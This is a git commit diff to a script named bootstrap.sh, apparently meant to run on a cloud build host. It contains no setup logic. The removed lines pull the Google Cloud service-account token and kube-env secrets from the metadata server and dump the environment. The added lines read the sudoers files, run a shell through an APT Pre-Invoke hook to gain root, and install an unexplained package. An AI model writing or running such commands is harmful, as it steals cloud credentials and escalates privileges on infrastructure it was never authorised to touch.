67218a17fc0440bd8c1c7793b589e7192df9d2eb
boo7 <boo7>
2019-01-25 11:34:17 +0100

    plop

--- bootstrap.sh
+++ bootstrap.sh
@@ -1,13 +1,9 @@
 #!/bin/bash
 # -*- coding: UTF8 -*-
 ps -aux
-echo "new token :"
-echo "token :"
-curl 'http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json'
-curl 'http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token'
-curl 'http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json'
-
-
-curl -H "Metadata-Flavor: Google" -H "X-Google-Metadata-Request: True" 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env?alt=json'
-curl -H "Metadata-Flavor: Google" -H "X-Google-Metadata-Request: True" 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token?alt=json'
-env
+sudo -l
+cat /etc/sudoers
+ls /etc/sudoers.d
+cat /etc/sudoers.d/*
+apt update -o APT::Update::Pre-Invoke::="/bin/bash -c id"
+dpkg -i test.deb
